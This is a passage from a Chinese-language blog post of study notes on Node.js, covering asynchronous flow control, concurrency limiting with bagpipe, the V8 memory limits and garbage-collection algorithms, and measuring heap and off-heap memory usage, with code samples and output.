<p>auto()方法能根据依赖关系自动分析，以最佳的顺序执行以上业务<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> deps = &#123;</span><br><span class="line">  readConfig: <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// read config file</span></span><br><span class="line">    callback();</span><br><span class="line">  &#125;,</span><br><span class="line">  connectMongoDB: [<span class="string">'readConfig'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    callback();</span><br><span class="line">  &#125;],</span><br><span class="line">  connectRedis: [<span class="string">'readConfig'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    callback();</span><br><span class="line">  &#125;],</span><br><span class="line">  complieAsserts: <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    callback();</span><br><span class="line">  &#125;,</span><br><span class="line">  uploadAsserts: [<span class="string">'complieAsserts'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    callback();</span><br><span class="line">  &#125;],</span><br><span class="line">  startup: [<span class="string">'connectMongoDB'</span>, <span class="string">'connectRedis'</span>, <span class="string">'uploadAsserts'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// startup</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span>.auto(deps);</span><br></pre></td></tr></table></figure></p>
<p>3.step(略)</p>
<p>4.wind(略)</p>
<h2 id="异步并发控制"><a href="#异步并发控制" class="headerlink" title="异步并发控制"></a>异步并发控制</h2><p>使用下面代码,发起100次异步调用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i ++) &#123;</span><br><span class="line">  <span class="keyword">async</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果并发量过大，下层服务器将会吃不消。</p>
<h2 id="bagpipe的解决方案"><a href="#bagpipe的解决方案" class="headerlink" title="bagpipe的解决方案"></a>bagpipe的解决方案</h2><p>如何对既有的异步API添加过载保护，我们期望的当然不是去改动API。bagpipe的解决方案是这样的</p>
<ol>
<li>通过一个队列来控制并发量</li>
<li>如果当前活跃(指调用发起但未执行回调)的异步调用量小于限定值，从队列中取出执行</li>
<li>如果活跃调用达到限定值，调用暂时存放在队列中</li>
<li>每个异步调用结束时，从队列中取出新的异步调用执行</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Bagpipe = <span class="built_in">require</span>(<span class="string">'bagpipe'</span>);</span><br><span class="line"><span class="comment">// 设定最大并发数为10</span></span><br><span class="line"><span class="keyword">var</span> bagpipe = <span class="keyword">new</span> Bagpipe(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  bagpipe.push(<span class="keyword">async</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 异步回调执行</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">bagpipe.on(<span class="string">'full'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">length</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.warn(<span class="string">'队列拥堵，当前长度为：'</span> + length);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>实现???暂略</p>
<h2 id="async的解决方案-暂略"><a href="#async的解决方案-暂略" class="headerlink" title="async的解决方案???暂略"></a>async的解决方案???暂略</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从社区和过往的经验而言，JavaScript异步编程的难题已经基本解决，无论是通过事件，还是通过Promise/Deferred模式，或者流程控制库。</p>
<h1 id="内存控制"><a href="#内存控制" class="headerlink" title="内存控制"></a>内存控制</h1><p>Node内存控制在海量请求的前提下需要进行探讨。</p>
<h2 id="V8的垃圾回收机制与内存限制"><a href="#V8的垃圾回收机制与内存限制" class="headerlink" title="V8的垃圾回收机制与内存限制"></a>V8的垃圾回收机制与内存限制</h2><p>JavaScript由垃圾回收机制来进行自动内存管理，内存管理的好坏、垃圾回收状况是否优良，都会对服务构成影响。这一切都与Node的JavaScript执行引擎V8息息相关。</p>
<h2 id="V8的内存限制"><a href="#V8的内存限制" class="headerlink" title="V8的内存限制"></a>V8的内存限制</h2><p>在一般的后端开发语言中，在基本的内存使用上没有什么限制，然而在Node中通过JavaScript使用内存时就会发现只能使用部分内存(64位系统下约为1.4GB，32位系统下约为0.7GB)。</p>
<p>因为Node中使用的JavaScript对象基本上都是通过V8自己的方式进行分配和管理的。而V8会限制使用的内存量。</p>
<h2 id="V8的对象分配"><a href="#V8的对象分配" class="headerlink" title="V8的对象分配"></a>V8的对象分配</h2><p>在V8中，所有的JavaScript对象都是通过堆来进行分配的。Node提供了V8中内存使用量的查看方式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ node</span><br><span class="line">&gt; process.memoryUsage();</span><br><span class="line">&#123; <span class="attr">rss</span>: <span class="number">14958592</span>,</span><br><span class="line">  heapTotal: <span class="number">7195904</span>,</span><br><span class="line">  heapUsed: <span class="number">2821496</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>heapTotal和heapUsed是V8的堆内存使用情况，前者是已申请到的堆内存，后者是当前使用的量。</p>
<p>如果已申请的堆空闲内存不够分配新的对象，将继续申请堆内存，直到堆的大小超过V8的限制为止。</p>
<p>V8限制堆内存的大小，表层原因为V8最初为浏览器而设计，不太可能遇到用大量内存的场景。深层原因是V8的垃圾回收机制的限制。以1.5GB的垃圾回收堆内存为例，V8做一次小的垃圾回收需要50ms以上,做一次非增量式的垃圾回收甚至需要1s以上。这是垃圾回收中引起JavaScript线程暂停执行的时间，在这样的时间花销下，应用的性能和响应能力都会直线下降。因此，直接限制堆内存是一个好的选择。</p>
<p>当然V8依然提供了选项让我们使用更多的内存。Node在启动时可以传递–max-old-space-size或–max-new-space-size来调整内存限制的大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node --max-old-space-size=1700 test.js // 单位为MB</span><br><span class="line">node --max-new-space-size=1024 test.js // 单位为KB</span><br></pre></td></tr></table></figure></p>
<p>上述参数在V8初始化时生效，一旦生效就不能再动态改变。</p>
<h2 id="V8的垃圾回收机制"><a href="#V8的垃圾回收机制" class="headerlink" title="V8的垃圾回收机制"></a>V8的垃圾回收机制</h2><p>1.V8主要的垃圾回收算法</p>
<p>V8的垃圾回收策略主要基于分代式垃圾回收机制。因为在实际应用中，对象的生存周期长短不一，不同的算法的算法只能针对特定情况具有良好的效果。</p>
<p>1.1-V8的内存分代</p>
<p>将内存分为新生代和老生代。新生代中的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象<br><img src="https://mfaying.github.io/static/images/node/41.jpg" alt="avatar"></p>
<p>V8堆的整体大小就是新生代所用内存空间加上老生代的内存空间。前面提到的内存限制调整的就是新老生代。这两个最大值需要在启动时就指定，这意味着V8使用的内存没有办法根据使用情况自动扩充，当内存分配过程中超过极限值，就会引起进程出错。</p>
<p>在64位系统和32位系统下会分别只能使用约1.4GB和约0.7GB的大小。这个限制在源码中可以找到。源码中老生代设置在64位系统下为1400MB,在32位系统下为700MB</p>
<p>新生代内存由两个reserved_semispace_size_所构成。reserved_semispace_size_在64和32位系统上分别为16MB和8MB</p>
<p>V8堆内存的最大保留空间为 4 * reserved_semispace_size_ + max_old_generation_size_;在64位系统上为1464MB，32位系统上为732MB.</p>
<p>1.2-Scavenge算法<br>新生代对象主要通过Scavenge算法进行垃圾回收。在具体实现中，主要采用了Cheney算法。</p>
<p>Cheney算法一种采用复制方式实现的垃圾回收算法。它将堆内存一分为二，每一部分空间称为semispace。在这两个semispace空间中，只有一个处于使用中，另一个处于闲置状态。处于使用状态的semispace空间称为From空间，处于闲置状态的空间称为To空间。当我们分配对象时，先是在From空间中进行分配。当开始进行垃圾回收时，会检查From空间中的存活对象，这些存活对象被复制到To空间，而非存活对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。</p>
<p>Scavenge算法的缺点是只能使用堆内存中的一半，但由于只复制存活的对象，并且对于生命周期短的场景存活对象只占少部分，所以它在时间效率上有优异的表现。</p>
<p>由于Scavenge是典型的牺牲空间换取时间的算法，所以无法大规模地应用到所有的垃圾回收中。但可以发现，Scavenge非常适合应用在新生代中，因为新生代中对象的生命周期较短，恰恰适合这个算法。</p>
<p>是故，V8的堆内存示意图应当如图<br><img src="https://mfaying.github.io/static/images/node/42.jpg" alt="avatar"></p>
<p>当一个对象经过多次复制依然存活时，它随后会被移动到老生代中，From空间中存活对象在复制到To空间之前需要进行检查。在一定条件下，需要将存活周期长的对象移动到老生代中，这个过程也叫晋升。</p>
<p>晋升的条件主要有两个,一个是对象是否经历过Scavenge回收，一个是To空间的内存占用比超过限制。</p>
<p>在默认情况下，V8的对象分配主要集中在From空间中，对象从From空间中复制到To空间时，会检查它的内存地址来判断这个对象是否已经经历过一次Scavenge回收。如果已经经历过了，会将该对象从From空间复制到老生代空间中，如果没有，则复制到To空间中。<br><img src="https://mfaying.github.io/static/images/node/43.jpg" alt="avatar"></p>
<p>另一个判断条件是当要从From空间复制一个对象到To空间时，如果To空间已经使用了超过25%，则这个对象直接晋升到老生代空间中<br><img src="https://mfaying.github.io/static/images/node/44.jpg" alt="avatar"></p>
<p>设置25%这个限制值的原因是当这次Scavenge回收完成后，这个To空间将变成From空间，接下来的内存分配将在这个空间中进行。如果占比过高，会影响后续的内存分配。</p>
<p>1.3-Mark-Sweep &amp; Mark-Compact</p>
<p>对于老生代中的对象，由于存活对象占较大比重，再采用Scavenge的方式会有两个问题：一个是存活对象较多，复制存活对象的效率将会很低；另一个问题依然是浪费一半空间的问题。为此，老生代采用Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。</p>
<p>Mark-Sweep是标记清除的意思。在标记阶段遍历堆中所以对象，并标记活着的对象，清除阶段，清除没有被标记的对象。死对象在老生代中只占较少部分，这是Mark-Sweep能高效处理的原因。下图，黑色部分标记为死亡对象<br><img src="https://mfaying.github.io/static/images/node/45.jpg" alt="avatar"></p>
<p>Mark-Sweep最大的问题是在进行一次标记清除回收后，内存空间会出现不连续的状态。这种内存碎片会对后续的内存分配造成问题，因为很可能出现需要分配一个大对象的情况，这时所有的碎片空间都无法完成此次分配，就会提前触发垃圾回收，而这次回收是不必要的。</p>
<p>Mack-Compact是标记整理的意思，是在在Mark-Sweep的基础上演变而来的，它们的差别在于对象在标记为死亡后，在整理的过程中，将活着的对象往一端移动，移动完成后，直接清理掉边界外的内存。下图白色格子为存活对象，深色格子为死亡对象，浅色格子为存活对象移动后留下的空洞。<br><img src="https://mfaying.github.io/static/images/node/46.jpg" alt="avatar"></p>
<p>完成移动后，就可以直接清除最右边的存活对象后面的内存区域完成回收。</p>
<p>在V8的回收策略中两者是结合使用的。<br><img src="https://mfaying.github.io/static/images/node/47.jpg" alt="avatar"></p>
<p>在取舍中，V8主要使用Mark-Sweep，在空间不足以对从新生代中晋升过来的对象进行分配时才使用Mark-Compact。</p>
<p>1.4-Incremental Marking</p>
<p>为了避免出现JavaScript应用逻辑与垃圾回收器看到的不一致的情况，垃圾回收的3种基本算法都需要将应用逻辑暂停下来，待执行完垃圾回收后再恢复执行应用逻辑，这种行为被称为“全停顿”。在V8的分代式垃圾回收中，一次小垃圾回收只收集新生代，由于新生代默认配置得较小，且其中活动对象通常较少，所以即便它是全停顿的影响也不大。但V8的老生代通常配置得较大，且存活对象较多，全堆垃圾回收的标记、清理、整理等动作造成的停顿就会比较可怕。</p>
<p>为了降低全堆垃圾回收带来的停顿时间，V8先从标记阶段入手，将原本要一口气停顿完成的动作改为增量标记，每做完一“步进”将让JavaScript应用逻辑执行一小会儿，垃圾回收与应用逻辑交替执行直到标记阶段完成。<br><img src="https://mfaying.github.io/static/images/node/48.jpg" alt="avatar"></p>
<p>V8后续还引入了延迟清理与增量式整理，让清理与整理动作也变成增量式的。同时还计划引入并行标记与并行清理，进一步利用多核性能降低每次停顿的时间。</p>
<p>总结</p>
<p>想要高性能的执行效率，需要注意让垃圾回收尽量少地进行，尤其是全堆垃圾回收。</p>
<p>服务端在访问量大、内存大量占用的时候，老生代中的存活对象骤增，不仅造成清理/整理过程费时，还会造成内存紧张，甚至溢出。</p>
<h2 id="查看垃圾回收日志"><a href="#查看垃圾回收日志" class="headerlink" title="查看垃圾回收日志"></a>查看垃圾回收日志</h2><p>在启动时添加–trace_gc参数。执行结束后，将会在gc.log文件中得到所有垃圾回收信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node --trace_gc -e &quot;var a = [];for (var i = 0; i &lt; 1000000; i++) a.push(new Array(100));&quot; &gt; gc.log</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/49.jpg" alt="avatar"><br>通过分析垃圾回收日志，可以了解垃圾回收的运行状况，找出垃圾回收的哪些阶段比较耗时，触发的原因是什么。</p>
<p>通过在Node启动时使用–prof参数，可以得到V8执行时的性能分析数据，其中包含了垃圾回收执行时占用的时间。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test01.js</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ node --prof test01.js</span><br></pre></td></tr></table></figure></p>
<p>得到一个日志文件，该日志文件基本不具备可读性，v8提供了linux-tick-processor工具用于统计日志信息。将该目录添加到环境变量PATH中调用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ linux-tick-processor v8.log</span><br></pre></td></tr></table></figure></p>
<p>统计结果<br><img src="https://mfaying.github.io/static/images/node/50.jpg" alt="avatar"><br>其中垃圾回收部分<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[GC]:</span><br><span class="line">  ticks total nonlib name</span><br><span class="line">   2      5.4%</span><br></pre></td></tr></table></figure></p>
<p>由于不断分配对象，垃圾回收所占的时间为5.4%。这意味着事件循环执行1000毫秒要给出54毫秒的时间用于垃圾回收。</p>
<h2 id="高效使用内存"><a href="#高效使用内存" class="headerlink" title="高效使用内存"></a>高效使用内存</h2><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>提到如何触发垃圾回收，第一个要介绍的是作用域。在JavaScript中能形成作用域的有函数调用、with以及全局作用域<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> local = &#123;&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>foo函数在每次调用时会创建对应的作用域，函数执行结束后，该作用域将会销毁。同时作用域中声明的局部变量分配在该作用域上，随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短。在这个示例中，由于对象非常小，将会分配在新生代中的From空间。在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。<br>1.1 标识符查找</p>
<p>与作用域相关的即是标识符查找。所谓标识符，可以理解为变量名。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(local);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>JavaScript在执行时会去查找该变量定义在哪里。它最先查找的是当前作用域，如果在当前作用域中无法找到该变量的声明，将会向上级的作用域里查找，直到查到为止。</p>
<p>1.2 作用域链</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> local = <span class="string">'local var'</span>;</span><br><span class="line">  <span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> local = <span class="string">'another var'</span>;</span><br><span class="line">    <span class="keyword">var</span> baz = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(local);<span class="comment">// another var</span></span><br><span class="line">    &#125;;</span><br><span class="line">    baz();</span><br><span class="line">  &#125;;</span><br><span class="line">  bar();</span><br><span class="line">&#125;;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure>
<p>存在作用域链，不断向上查找。了解作用域，有助于我们了解变量的分配和释放。</p>
<p>1.3 变量的主动释放</p>
<p>如果变量是全局变量(不通过var声明或定义在global变量上)，由于全局作用域需要直到进程退出才能释放，此时将导致引用的对象常驻内存（常驻在老生代中）。可以通过delete操作来删除引用关系。或者将变量重新赋值，让旧的对象脱离引用关系。在接下来的老生代内存清理和整理的过程中，会被释放。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">global.foo = <span class="string">'a'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(global.foo);</span><br><span class="line"><span class="keyword">delete</span> global.foo;<span class="comment">// a</span></span><br><span class="line"><span class="comment">// 或者重新赋值</span></span><br><span class="line"><span class="comment">// global.foo = undefined; // or null</span></span><br><span class="line"><span class="built_in">console</span>.log(global.foo);</span><br></pre></td></tr></table></figure></p>
<p>如果在非全局作用域中，想主动释放变量引用的对象，也可以通过这样的方式。虽然delete操作和重新赋值具有相同的效果，但是在V8中通过delete删除对象的属性有可能干扰V8的优化，所以赋值方式较好。</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>在JavaScript实现外部作用域访问内部作用域变量的方法叫做闭包<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> local = <span class="string">"局部变量"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> local;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> baz = bar();</span><br><span class="line">  <span class="built_in">console</span>.log(baz());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo();<span class="comment">// "局部变量"</span></span><br></pre></td></tr></table></figure></p>
<p>在外部作用域中还是无法直接访问local,但是若要访问它，只要通过这个中间函数稍作周转即可。闭包的问题在于，一旦有变量引用这个中间函数，这个中间函数将不会释放，同时也会使原始的作用域不会得到释放，作用域中产生的内存占用也不会得到释放。除非不再引用，才会逐步释放。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在正常的JavaScript执行中，无法立即回收的内存由闭包和全局变量引用这两种情况。由于V8的内存限制，要注意此类变量的使用。</p>
<h2 id="内存指标"><a href="#内存指标" class="headerlink" title="内存指标"></a>内存指标</h2><p>一般而言，应用中存在一些全局性的对象是正常的，而且在正常使用中，变量都会自动释放回收。但是也会存在一些我们认为会回收但是却没有被回收的对象。</p>
<h2 id="查看内存使用情况"><a href="#查看内存使用情况" class="headerlink" title="查看内存使用情况"></a>查看内存使用情况</h2><p>除了process.memoryUsage()，os模块的totalmem()和freemem()也可以查看内存使用情况。</p>
<p>1.查看进程的内存占用</p>
<p>调用process.memoryUsage()可以查看Node进程的内存占用情况<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ node</span><br><span class="line">&gt; process.memoryUsage()</span><br><span class="line">&#123; <span class="attr">rss</span>: <span class="number">13852672</span>,</span><br><span class="line">  heapTotal: <span class="number">6131200</span>,</span><br><span class="line">  heapUsed: <span class="number">2757120</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>rss是resident set size的缩写，即进程常驻内存部分。进程的内存总共有几部分，一部分是rss，其余部分在交换区(swap)或者文件系统(filesystem)中。</p>
<p>heapTotal和heapUsed对应的是V8的堆内存信息。heapTotal是堆中总共申请的内存量，heapUsed表示目前堆中使用中的内存量，单位都是字节。</p>
<p>例子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> showMem = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> mem = process.memoryUsage();</span><br><span class="line">  <span class="keyword">var</span> format = <span class="function"><span class="keyword">function</span> (<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (bytes / <span class="number">1024</span> / <span class="number">1024</span>).toFixed(<span class="number">2</span>) + <span class="string">'MB'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Process: heapTotal '</span> + format(mem.heapTotal) + <span class="string">' heapUsed '</span> + format(mem.heapUsed) + <span class="string">' rss '</span> + format(mem.rss));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'-----------------------------'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> useMem = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> size = <span class="number">20</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(size);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    arr[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> total = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j ++) &#123;</span><br><span class="line">  showMem();</span><br><span class="line">  total.push(useMem());</span><br><span class="line">&#125;</span><br><span class="line">showMem();</span><br></pre></td></tr></table></figure></p>
<p>执行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process: heapTotal 6.23MB heapUsed 3.81MB rss 19.66MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 167.75MB heapUsed 164.33MB rss 181.11MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 327.76MB heapUsed 324.33MB rss 341.19MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 487.77MB heapUsed 484.34MB rss 501.32MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 647.78MB heapUsed 644.34MB rss 661.38MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 807.79MB heapUsed 804.34MB rss 821.39MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 967.80MB heapUsed 964.35MB rss 981.41MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 1130.32MB heapUsed 1123.57MB rss 1141.77MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 1290.33MB heapUsed 1283.57MB rss 1301.79MB</span><br><span class="line">-----------------------------</span><br><span class="line"></span><br><span class="line">&lt;--- Last few GCs ---&gt;</span><br><span class="line"></span><br><span class="line">[39083:0x103800000]     1338 ms: Mark-sweep 1283.5 (1287.8) -&gt; 1283.5 (1287.8) MB, 110.8 / 0.0 ms  (average mu = 0.230, current mu = 0.003) last resort GC in old space requested</span><br><span class="line">[39083:0x103800000]     1450 ms: Mark-sweep 1283.5 (1287.8) -&gt; 1283.5 (1287.8) MB, 111.4 / 0.0 ms  (average mu = 0.131, current mu = 0.000) last resort GC in old space requested</span><br></pre></td></tr></table></figure></p>
<p>可以看到，3个值都在不断增长，在接近1500MB的时候，无法继续分配内存，然后进程内存溢出了。</p>
<h2 id="查看系统的内存占用"><a href="#查看系统的内存占用" class="headerlink" title="查看系统的内存占用"></a>查看系统的内存占用</h2><p>os模块的totalmem()和freemem()用于查看操作系统的内存使用情况，它们分别返回系统的总内存和闲置内存，以字节为单位<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> os = <span class="built_in">require</span>(<span class="string">'os'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> showMem = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> format = <span class="function"><span class="keyword">function</span> (<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (bytes / <span class="number">1024</span> / <span class="number">1024</span>).toFixed(<span class="number">2</span>) + <span class="string">'MB'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'os.totalmem'</span>, format(os.totalmem()));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'os.freemem'</span>, format(os.freemem()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showMem();</span><br><span class="line"><span class="comment">// os.totalmem 8192.00MB</span></span><br><span class="line"><span class="comment">// os.freemem 452.36MB</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到我的电脑的总内存为8GB，当前闲置内存为452.36MB</p>
<h2 id="堆外内存"><a href="#堆外内存" class="headerlink" title="堆外内存"></a>堆外内存</h2><p>可以看到堆中的内存用量总是小于进程的常驻内存用量，这意味着Node中的内存使用并非都是通过V8进行分配的。我们将那些不是通过V8分配的内存称为堆外内存</p>
<p>我们将Array换成Buffer，将size变大<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> useMem = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> size = <span class="number">200</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">var</span> buffer = <span class="keyword">new</span> Buffer(size);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i ++) &#123;</span><br><span class="line">    buffer[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process: heapTotal 6.23MB heapUsed 3.81MB rss 19.80MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 8.23MB heapUsed 4.53MB rss 221.43MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 8.23MB heapUsed 4.54MB rss 422.14MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.23MB heapUsed 4.01MB rss 593.79MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.23MB heapUsed 4.01MB rss 745.22MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.23MB heapUsed 3.77MB rss 945.27MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1145.29MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1142.21MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1194.72MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1306.51MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1320.05MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.72MB rss 1382.52MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1582.52MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1782.52MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 10.73MB heapUsed 3.71MB rss 1955.04MB</span><br><span class="line">-----------------------------</span><br><span class="line">Process: heapTotal 7.73MB heapUsed 3.71MB rss 1961.53MB</span><br><span class="line">-----------------------------</span><br><span class="line">(node:39922) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.</span><br></pre></td></tr></table></figure></p>
<p>heapTotal和heapUsed的变化极小，唯一变化的是rss值,并且该值已经超过V8的限制值。这是因为Buffer对象不同于其他对象，它不经过V8的内存分配机制，所以也不会有堆内存的大小限制。</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>Node的内存构成主要由通过V8进行分配的部分和Node自行分配的部分。受V8的垃圾回收限制的主要是V8的堆内存。</p>
